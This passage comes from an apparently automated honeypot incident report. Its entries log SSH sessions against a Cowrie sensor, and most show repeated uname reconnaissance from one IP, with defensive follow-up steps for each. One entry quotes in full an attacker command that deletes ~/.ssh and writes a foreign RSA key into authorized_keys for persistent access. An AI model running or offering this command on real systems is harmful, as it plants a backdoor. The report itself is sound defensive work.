| `2026-07-13 06:47:22` | `cowrie.command.input` |
| `2026-07-13 06:47:22` | `cowrie.log.closed` |
| `2026-07-13 06:47:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-162515c1332e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:47 |
| **Last Seen** | 2026-07-13 06:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:47:27` | `cowrie.session.connect` |
| `2026-07-13 06:47:27` | `cowrie.client.version` |
| `2026-07-13 06:47:27` | `cowrie.client.kex` |
| `2026-07-13 06:47:30` | `cowrie.login.success` |
| `2026-07-13 06:47:31` | `cowrie.session.params` |
| `2026-07-13 06:47:31` | `cowrie.command.input` |
| `2026-07-13 06:47:31` | `cowrie.log.closed` |
| `2026-07-13 06:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3a9aa3c6ea7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:47 |
| **Last Seen** | 2026-07-13 06:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:47:35` | `cowrie.session.connect` |
| `2026-07-13 06:47:35` | `cowrie.client.version` |
| `2026-07-13 06:47:35` | `cowrie.client.kex` |
| `2026-07-13 06:47:37` | `cowrie.login.success` |
| `2026-07-13 06:47:38` | `cowrie.session.params` |
| `2026-07-13 06:47:38` | `cowrie.command.input` |
| `2026-07-13 06:47:39` | `cowrie.log.closed` |
| `2026-07-13 06:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48854a79b974

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:47 |
| **Last Seen** | 2026-07-13 06:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:47:43` | `cowrie.session.connect` |
| `2026-07-13 06:47:43` | `cowrie.client.version` |
| `2026-07-13 06:47:43` | `cowrie.client.kex` |
| `2026-07-13 06:47:45` | `cowrie.login.success` |
| `2026-07-13 06:47:47` | `cowrie.session.params` |
| `2026-07-13 06:47:47` | `cowrie.command.input` |
| `2026-07-13 06:47:48` | `cowrie.log.closed` |
| `2026-07-13 06:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7949bb04e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:47 |
| **Last Seen** | 2026-07-13 06:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:47:52` | `cowrie.session.connect` |
| `2026-07-13 06:47:52` | `cowrie.client.version` |
| `2026-07-13 06:47:52` | `cowrie.client.kex` |
| `2026-07-13 06:47:53` | `cowrie.login.success` |
| `2026-07-13 06:47:54` | `cowrie.session.params` |
| `2026-07-13 06:47:54` | `cowrie.command.input` |
| `2026-07-13 06:47:54` | `cowrie.log.closed` |
| `2026-07-13 06:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14cf89b637ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:00` | `cowrie.session.connect` |
| `2026-07-13 06:48:00` | `cowrie.client.version` |
| `2026-07-13 06:48:00` | `cowrie.client.kex` |
| `2026-07-13 06:48:00` | `cowrie.login.success` |
| `2026-07-13 06:48:01` | `cowrie.session.params` |
| `2026-07-13 06:48:01` | `cowrie.command.input` |
| `2026-07-13 06:48:01` | `cowrie.log.closed` |
| `2026-07-13 06:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0abf003fb19

| Field | Detail |
|---|---|
| **Source IP** | `45.182.5[.]98` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:07` | `cowrie.session.connect` |
| `2026-07-13 06:48:08` | `cowrie.client.version` |
| `2026-07-13 06:48:08` | `cowrie.client.kex` |
| `2026-07-13 06:48:11` | `cowrie.login.success` |
| `2026-07-13 06:48:11` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.182.5[.]98` to AbuseIPDB if not already reported
- [ ] Block `45.182.5[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfbb68b05375

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:08` | `cowrie.session.connect` |
| `2026-07-13 06:48:08` | `cowrie.client.version` |
| `2026-07-13 06:48:08` | `cowrie.client.kex` |
| `2026-07-13 06:48:09` | `cowrie.login.success` |
| `2026-07-13 06:48:10` | `cowrie.session.params` |
| `2026-07-13 06:48:10` | `cowrie.command.input` |
| `2026-07-13 06:48:11` | `cowrie.log.closed` |
| `2026-07-13 06:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c4f4b95d216

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:16` | `cowrie.session.connect` |
| `2026-07-13 06:48:16` | `cowrie.client.version` |
| `2026-07-13 06:48:16` | `cowrie.client.kex` |
| `2026-07-13 06:48:17` | `cowrie.login.success` |
| `2026-07-13 06:48:18` | `cowrie.session.params` |
| `2026-07-13 06:48:18` | `cowrie.command.input` |
| `2026-07-13 06:48:19` | `cowrie.log.closed` |
| `2026-07-13 06:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0ff5756510

| Field | Detail |
|---|---|
| **Source IP** | `196.191.142[.]67` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:17` | `cowrie.session.connect` |
| `2026-07-13 06:48:18` | `cowrie.client.version` |
| `2026-07-13 06:48:18` | `cowrie.client.kex` |
| `2026-07-13 06:48:21` | `cowrie.login.success` |
| `2026-07-13 06:48:22` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.191.142[.]67` to AbuseIPDB if not already reported
- [ ] Block `196.191.142[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d3c5d68993e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:23` | `cowrie.session.connect` |
| `2026-07-13 06:48:24` | `cowrie.client.version` |
| `2026-07-13 06:48:24` | `cowrie.client.kex` |
| `2026-07-13 06:48:25` | `cowrie.login.success` |
| `2026-07-13 06:48:26` | `cowrie.session.params` |
| `2026-07-13 06:48:26` | `cowrie.command.input` |
| `2026-07-13 06:48:27` | `cowrie.log.closed` |
| `2026-07-13 06:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d9b63310f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:31` | `cowrie.session.connect` |
| `2026-07-13 06:48:32` | `cowrie.client.version` |
| `2026-07-13 06:48:32` | `cowrie.client.kex` |
| `2026-07-13 06:48:33` | `cowrie.login.success` |
| `2026-07-13 06:48:34` | `cowrie.session.params` |
| `2026-07-13 06:48:34` | `cowrie.command.input` |
| `2026-07-13 06:48:35` | `cowrie.log.closed` |
| `2026-07-13 06:48:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38a85e18f79d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:39` | `cowrie.session.connect` |
| `2026-07-13 06:48:39` | `cowrie.client.version` |
| `2026-07-13 06:48:39` | `cowrie.client.kex` |
| `2026-07-13 06:48:41` | `cowrie.login.success` |
| `2026-07-13 06:48:42` | `cowrie.session.params` |
| `2026-07-13 06:48:42` | `cowrie.command.input` |
| `2026-07-13 06:48:42` | `cowrie.log.closed` |
| `2026-07-13 06:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e83775da9bf9

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:40` | `cowrie.session.connect` |
| `2026-07-13 06:48:40` | `cowrie.client.version` |
| `2026-07-13 06:48:40` | `cowrie.client.kex` |
| `2026-07-13 06:48:42` | `cowrie.login.success` |
| `2026-07-13 06:48:43` | `cowrie.session.params` |
| `2026-07-13 06:48:43` | `cowrie.command.input` |
| `2026-07-13 06:48:43` | `cowrie.command.failed` |
| `2026-07-13 06:48:44` | `cowrie.log.closed` |
| `2026-07-13 06:48:45` | `cowrie.session.params` |
| `2026-07-13 06:48:45` | `cowrie.command.input` |
| `2026-07-13 06:48:45` | `cowrie.session.file_download` |
| `2026-07-13 06:48:45` | `cowrie.log.closed` |
| `2026-07-13 06:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de6e9ea98c92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:45` | `cowrie.session.connect` |
| `2026-07-13 06:48:46` | `cowrie.client.version` |
| `2026-07-13 06:48:46` | `cowrie.client.kex` |
| `2026-07-13 06:48:48` | `cowrie.login.success` |
| `2026-07-13 06:48:50` | `cowrie.session.params` |
| `2026-07-13 06:48:50` | `cowrie.command.input` |
| `2026-07-13 06:48:51` | `cowrie.log.closed` |
| `2026-07-13 06:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecdc75e29127

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:45` | `cowrie.session.connect` |
| `2026-07-13 06:48:45` | `cowrie.client.version` |
| `2026-07-13 06:48:46` | `cowrie.client.kex` |
| `2026-07-13 06:48:47` | `cowrie.login.success` |
| `2026-07-13 06:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d9de77e0886

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:47` | `cowrie.session.connect` |
| `2026-07-13 06:48:47` | `cowrie.client.version` |
| `2026-07-13 06:48:48` | `cowrie.client.kex` |
| `2026-07-13 06:48:49` | `cowrie.login.success` |
| `2026-07-13 06:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-138282aebf2d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:51` | `cowrie.session.connect` |
| `2026-07-13 06:48:52` | `cowrie.client.version` |
| `2026-07-13 06:48:52` | `cowrie.client.kex` |
| `2026-07-13 06:48:54` | `cowrie.login.success` |
| `2026-07-13 06:48:56` | `cowrie.session.params` |
| `2026-07-13 06:48:56` | `cowrie.command.input` |
| `2026-07-13 06:48:58` | `cowrie.log.closed` |
| `2026-07-13 06:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c252def0b8d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:48 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:48:58` | `cowrie.session.connect` |
| `2026-07-13 06:48:59` | `cowrie.client.version` |
| `2026-07-13 06:48:59` | `cowrie.client.kex` |
| `2026-07-13 06:49:01` | `cowrie.login.success` |
| `2026-07-13 06:49:03` | `cowrie.session.params` |
| `2026-07-13 06:49:03` | `cowrie.command.input` |
| `2026-07-13 06:49:04` | `cowrie.log.closed` |
| `2026-07-13 06:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7450dbc41fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:04` | `cowrie.session.connect` |
| `2026-07-13 06:49:05` | `cowrie.client.version` |
| `2026-07-13 06:49:05` | `cowrie.client.kex` |
| `2026-07-13 06:49:08` | `cowrie.login.success` |
| `2026-07-13 06:49:09` | `cowrie.session.params` |
| `2026-07-13 06:49:09` | `cowrie.command.input` |
| `2026-07-13 06:49:10` | `cowrie.log.closed` |
| `2026-07-13 06:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c15ee13e565f

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]10` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:04` | `cowrie.session.connect` |
| `2026-07-13 06:49:05` | `cowrie.login.success` |
| `2026-07-13 06:49:06` | `cowrie.session.params` |
| `2026-07-13 06:49:06` | `cowrie.command.input` |
| `2026-07-13 06:49:06` | `cowrie.command.input` |
| `2026-07-13 06:49:07` | `cowrie.command.input` |
| `2026-07-13 06:49:08` | `cowrie.command.input` |
| `2026-07-13 06:49:08` | `cowrie.command.failed` |
| `2026-07-13 06:49:08` | `cowrie.log.closed` |
| `2026-07-13 06:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]10` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99c3861bbee5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:11` | `cowrie.session.connect` |
| `2026-07-13 06:49:12` | `cowrie.client.version` |
| `2026-07-13 06:49:12` | `cowrie.client.kex` |
| `2026-07-13 06:49:14` | `cowrie.login.success` |
| `2026-07-13 06:49:16` | `cowrie.session.params` |
| `2026-07-13 06:49:16` | `cowrie.command.input` |
| `2026-07-13 06:49:17` | `cowrie.log.closed` |
| `2026-07-13 06:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c577c6908cc5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:17` | `cowrie.session.connect` |
| `2026-07-13 06:49:18` | `cowrie.client.version` |
| `2026-07-13 06:49:18` | `cowrie.client.kex` |
| `2026-07-13 06:49:20` | `cowrie.login.success` |
| `2026-07-13 06:49:21` | `cowrie.session.params` |
| `2026-07-13 06:49:21` | `cowrie.command.input` |
| `2026-07-13 06:49:21` | `cowrie.log.closed` |
| `2026-07-13 06:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b05db156ccbb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:25` | `cowrie.session.connect` |
| `2026-07-13 06:49:25` | `cowrie.client.version` |
| `2026-07-13 06:49:25` | `cowrie.client.kex` |
| `2026-07-13 06:49:26` | `cowrie.login.success` |
| `2026-07-13 06:49:27` | `cowrie.session.params` |
| `2026-07-13 06:49:27` | `cowrie.command.input` |
| `2026-07-13 06:49:27` | `cowrie.log.closed` |
| `2026-07-13 06:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47557732bc05

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:31` | `cowrie.session.connect` |
| `2026-07-13 06:49:31` | `cowrie.client.version` |
| `2026-07-13 06:49:31` | `cowrie.client.kex` |
| `2026-07-13 06:49:33` | `cowrie.login.success` |
| `2026-07-13 06:49:34` | `cowrie.session.params` |
| `2026-07-13 06:49:34` | `cowrie.command.input` |
| `2026-07-13 06:49:34` | `cowrie.log.closed` |
| `2026-07-13 06:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e136cc9d9f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
